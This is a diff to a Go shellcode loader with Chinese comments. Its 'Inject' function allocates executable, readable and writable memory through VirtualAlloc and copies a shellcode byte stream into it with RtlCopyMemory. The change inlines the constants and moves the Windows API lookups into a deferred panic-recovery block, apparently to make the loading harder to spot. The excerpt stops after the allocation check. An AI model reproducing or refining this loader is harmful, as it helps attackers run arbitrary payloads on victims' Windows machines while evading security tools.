@@ -6,28 +6,19 @@ import (
 	"unsafe"
 )
 
-const (
-	MemCommit            = 0x1000 //将该内存映射到物理内存
-	MemReserve           = 0x2000 //开辟一块内存，供shellcode进程使用，即保留内存
-	PageExecuteReadwrite = 0x40   //此块内存可以执行代码，加载器可以对该此块进行操作。即execute、read、write
-)
-
-var (
-	//调用winApi
-	kernel32      = syscall.MustLoadDLL("kernel32.dll")   //调用Windows内核
-	ntdll         = syscall.MustLoadDLL("ntdll.dll")      //调用ntdll，进行内存操作
-	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc") //申请内存空间
-	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   //内存块复制
-)
-
 //Inject shellcode注入函数
 func Inject(b []byte) {
 
 	//捕获数组下标越界
 	defer func() {
 		if err := recover(); err != nil {
+			//调用Windows API
+			var (
+				VirtualAlloc  = syscall.MustLoadDLL("kernel32.dll").MustFindProc("VirtualAlloc") //使用kernel32.dll的VirtualAlloc函数申请虚拟内存
+				RtlCopyMemory = syscall.MustLoadDLL("ntdll.dll").MustFindProc("RtlCopyMemory")   //内存块复制
+			)
 			//使用内存操作api开辟一块内存，然后将shellcode的字节流写入
-			addr, _, err := VirtualAlloc.Call(0, uintptr(len(b)), MemCommit|MemReserve, PageExecuteReadwrite)
+			addr, _, err := VirtualAlloc.Call(0, uintptr(len(b)), 0x1000|0x2000, 0x40)
 			if err != nil && err.Error() != "The operation completed successfully." {
 				syscall.Exit(0)
 			}
